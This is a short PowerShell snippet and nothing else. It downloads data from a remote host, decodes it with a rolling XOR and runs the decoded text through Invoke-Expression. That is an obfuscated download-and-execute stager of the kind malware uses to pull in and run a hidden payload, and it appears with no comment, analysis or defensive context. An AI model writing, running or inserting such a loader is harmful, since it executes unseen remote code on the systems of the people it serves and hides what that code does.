$bytes = (New-Object Net.WebClient).DownloadData('http://rdcxk.invalid/activity')

$prev = [byte] 73

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
